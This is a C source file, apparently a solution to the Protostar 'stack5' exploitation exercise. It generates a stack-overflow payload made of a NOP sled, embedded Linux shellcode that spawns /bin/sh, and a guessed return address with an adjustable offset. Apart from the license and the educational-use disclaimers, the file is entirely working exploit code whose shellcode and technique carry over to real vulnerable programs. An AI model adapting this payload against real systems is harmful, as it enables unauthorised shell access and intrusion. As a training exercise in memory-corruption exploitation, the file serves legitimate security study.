/*
* License
* Copyright (c) 2017 Ng Chiang Lin
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* This code is provided and to be used for educational purpose only.
* Computer misuse is a serious crime in Singapore and other
* countries, punishable by law.
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/


/*

This code is provided and to be used for educational purpose only.
Computer misuse is a serious crime in Singapore and other
countries, punishable by law. 

Simple C program to exploit stack overflow in protostar 
exploit exercise stack5 and launch a shell code. 

The program takes an offset argument for guessing 
the starting address of the payload.

The starting address is calculated as 
RET - offset * 4 

offset is set to 0 as default if no argument is 
provided. 

The program will print out payload code into stdout
that can be feed into the protostar stack5 binary. 

Ng Chiang Lin
April 2017

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static unsigned char shellcode[]={
'\xeb','\x16','\x31','\xc0','\x5b','\x88','\x43','\x07','\x89','\x5b',
'\x08','\x89','\x43','\x0c','\xb0','\x0b','\x8d','\x4b','\x08','\x8d',
'\x53','\x0c','\xcd','\x80','\xe8','\xe5','\xff','\xff','\xff','\x2f',
'\x62','\x69','\x6e','\x2f','\x73','\x68'};


#define BUFSZ 128 //Total size of payload including NOP sled
#define TBUFSZ 64 //The buffer size of the target
#define MAXOFF 256
#define ADDRLEN 4
#define RET 0xBFFFF7E0 //Initial return address value

int main(int argc, char* argv[])
{

   unsigned char buf[BUFSZ], addr[ADDRLEN], tmp;
   size_t shellsz;
   int i,j;
   unsigned int ret_addr=RET, mask;
   int offset = 0;

   if(argc > 1)
   {
      offset = atoi(argv[1]);
      if(offset < 0 || offset > MAXOFF)
      {
         fprintf(stderr, "Offset exceeded allowable value");
         exit(EXIT_FAILURE);
      }
   } 

   //Get the size of the shell code
   shellsz = sizeof(shellcode); 

   //Fill the front of the target buffer with NOP instruction 0x90
   for(i=0; i< TBUFSZ - shellsz ; i++)
       buf[i] = 0x90; 

   if(i + shellsz != TBUFSZ)
   {
       fprintf(stderr, "Error calculation of payload is wrong");
       exit(EXIT_FAILURE);
   }
   else
   { //Fill the rest of the target buffer with the shellcode
     for(j=0; i<TBUFSZ;j++,i++)
         buf[i]=shellcode[j]; 
   }
     
  //Calculate the return addr
  ret_addr = ret_addr - (offset * 4);
  
  //Convert return addr to char
  mask = 0xff;
  for(i=0; i< ADDRLEN; i++)
  {
      tmp = ret_addr &  mask;
      addr[i]=tmp;
      ret_addr = ret_addr >> 8 ;
  }

  //Fill up the rest of the buf with the return addr
  i = BUFSZ - TBUFSZ ;  
  j = 0;
  while(i<BUFSZ)
  {
     j = j % 4 ; 
     buf[i]=addr[j];
     i++; j++;
  }

  for(i=0;i<BUFSZ;i++)
     printf("%c", buf[i]);
  
 return 0;

}

